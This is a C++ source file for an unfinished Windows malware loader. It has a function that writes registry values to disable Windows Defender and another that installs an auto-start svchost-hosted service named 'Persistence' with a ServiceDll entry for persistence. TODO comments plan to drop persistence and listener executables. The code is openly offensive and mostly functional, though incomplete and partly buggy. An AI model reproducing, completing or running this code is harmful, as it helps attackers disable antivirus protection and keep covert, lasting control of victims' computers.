#include "loader.hpp"

int wmain() {
	Log("[+] Starting loader.", "loader");

	if (DisableDefender() != 0) {
		// disabling defender failed
	}

	// TODO: create working directory

	// TODO: create b64 config file

	// TODO: drop persistence and listener exes

	if (CreatePersistService() != 0) {
		// creating persistent service failed
	}

	// TODO: start service

	// keep window open for testing
	int x;
	std::cin >> x;

	return 0;
}

int DisableDefender() {
	std::map<LPCWSTR, std::map<LPCWSTR, DWORD>>::iterator outer;
	std::map<LPCWSTR, DWORD>::iterator inner;

	for (outer = registryEntries.begin(); outer != registryEntries.end(); outer++) {
		for (inner = outer->second.begin(); inner != outer->second.end(); inner++) {

			LSTATUS s;
			HKEY key;

			s = RegCreateKeyExW(
				HKLM,
				outer->first,
				0,
				NULL,
				REG_OPTION_NON_VOLATILE,
				KEY_ALL_ACCESS,
				NULL,
				&key,
				NULL
				);
			if (s != ERROR_SUCCESS) {
				std::wcout << L"opening key failed " << outer->first << L" " << inner->first << std::endl;
				return 1;
			}

			s = RegSetValueExW(
				key,
				inner->first,
				0,
				REG_DWORD,
				reinterpret_cast<BYTE *>(inner->second),
				sizeof(DWORD)
			);
			if (s != ERROR_SUCCESS) {
				std::wcout << L"writing key failed " << outer->first << L" " << inner->first << std::endl;
				return 2;
			}
		}
	}

	return 0;
}

int CreatePersistService() {
	SC_HANDLE hSCManager = NULL;
	SC_HANDLE hService = NULL;
	std::unique_ptr<void, decltype(&CloseHandle)> uphSCManager(static_cast<void*>(hSCManager), CloseHandle);
	std::unique_ptr<void, decltype(&CloseHandle)> uphService(static_cast<void*>(hService), CloseHandle);

	// open service manager
	hSCManager = OpenSCManagerW(
		NULL,
		NULL,
		SC_MANAGER_ALL_ACCESS
	);

	if (hSCManager == NULL) {
		return 1;
	}

	// create the service
	hService = CreateServiceW(
		hSCManager,
		L"Persistence",
		L"Persistence",
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_SHARE_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_NORMAL,
		L"C:\\Windows\\System32\\svchost.exe -k WinSysPersist",
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);

	if (hService == NULL) {
		return 2;
	}
	
	// configure the service dll path
	HKEY hKey;
	LSTATUS s = RegCreateKeyExW(
		HKLM,
		L"SYSTEM\\CurrentControlSet\\services\\Persistence\\Parameters",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_WRITE,
		NULL,
		&hKey,
		NULL
	);

	if (s != ERROR_SUCCESS) {
		
		return 3;
	}

	s = RegSetKeyValueW(
		hKey,
		NULL,
		L"ServiceDll",
		REG_EXPAND_SZ,
		dllPath,
		sizeof(LPCWSTR)+1
	);

	// optionally set service group

	return 0;
}